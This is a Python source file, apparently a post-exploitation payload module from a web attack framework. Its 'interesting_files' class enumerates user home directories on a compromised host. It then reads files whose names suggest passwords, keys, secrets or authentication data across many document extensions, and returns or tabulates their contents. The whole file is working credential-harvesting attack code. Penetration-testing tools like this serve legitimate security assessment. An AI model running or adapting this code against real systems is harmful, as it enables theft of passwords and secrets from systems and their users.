from plugins.attack.payloads.base_payload import base_payload
from core.ui.consoleUi.tables import table


class interesting_files(base_payload):
    '''
    Search for interesting files in all known directories. 
    '''
    def api_read(self, parameters):
        result = {}
        user_config_files = []

        interesting_extensions = []
        interesting_extensions.append('')   # no extension
        interesting_extensions.append('.txt')
        interesting_extensions.append('.doc')
        interesting_extensions.append('.readme')
        interesting_extensions.append('.xls')
        interesting_extensions.append('.xlsx')
        interesting_extensions.append('.docx')
        interesting_extensions.append('.pptx')
        interesting_extensions.append('.odt')
        interesting_extensions.append('.wri')
        interesting_extensions.append('.config')
        interesting_extensions.append('.nfo')
        interesting_extensions.append('.info')
        
        file_list = []
        file_list.append('passwords')
        file_list.append('passwd')
        file_list.append('password')
        file_list.append('access')
        file_list.append('auth')
        file_list.append('authentication')
        file_list.append('authenticate')
        file_list.append('secret')
        file_list.append('key')
        file_list.append('keys')
        file_list.append('permissions')
        file_list.append('perm')
        
        users_result = self.exec_payload('users')

        files_to_read = []
        
        #
        #    Create the list of files
        #
        for user in users_result:
            home = users_result[user]['home']

            for interesting_file in file_list:
                for extension in interesting_extensions:
                    file_fp = home + interesting_file + extension
                    files_to_read.append( file_fp )
        
        #
        #    Read the files
        #    
        for file_fp in files_to_read:
            content = self.shell.read(file_fp)
            if content:
                result[ file_fp ] = content
        return result
        
    def run_read(self, parameters):
        api_result = self.api_read( parameters )
                
        if not api_result:
            return 'No interesting files found.'
        else:
            rows = []
            rows.append( ['Interesting files',] )
            rows.append( [] )
            for filename in api_result:
                rows.append( [filename,] )
                    
            result_table = table( rows )
            result_table.draw( 80 )
            return 
        